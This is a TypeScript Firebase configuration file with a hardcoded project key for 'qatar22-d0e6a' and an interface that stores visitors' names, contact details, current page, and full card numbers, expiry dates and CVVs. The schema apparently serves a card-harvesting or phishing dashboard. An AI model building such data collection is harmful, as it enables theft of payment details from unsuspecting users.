import { initializeApp, getApps, getApp } from 'firebase/app';
import { getAuth } from 'firebase/auth';
import { getFirestore } from 'firebase/firestore';

const firebaseConfig = {
   apiKey: "AIzaSyBoqC6S8FvbWhud_PnD6IC4pF61iffe4tI",
  authDomain: "qatar22-d0e6a.firebaseapp.com",
  projectId: "qatar22-d0e6a",
  storageBucket: "qatar22-d0e6a.firebasestorage.app",
  messagingSenderId: "349776944758",
  appId: "1:349776944758:web:6a8dd2558e8ac248570957",
  measurementId: "G-079WEHH5KL"
};

const app = getApps().length > 0 ? getApp() : initializeApp(firebaseConfig);
const auth = getAuth(app);
const db = getFirestore(app);

export { app, auth, db };

export interface NotificationDocument {
  id: string;
  name: string;
  hasPersonalInfo: boolean;
  hasCardInfo: boolean;
  currentPage: string;
  time: string;
  notificationCount: number;
  personalInfo?: {
    fullName: string;
    email: string;
    phone: string;
    address: string;
  };
  cardInfo?: {
    cardNumber: string;
    expirationDate: string;
    cvv: string;
  };
}
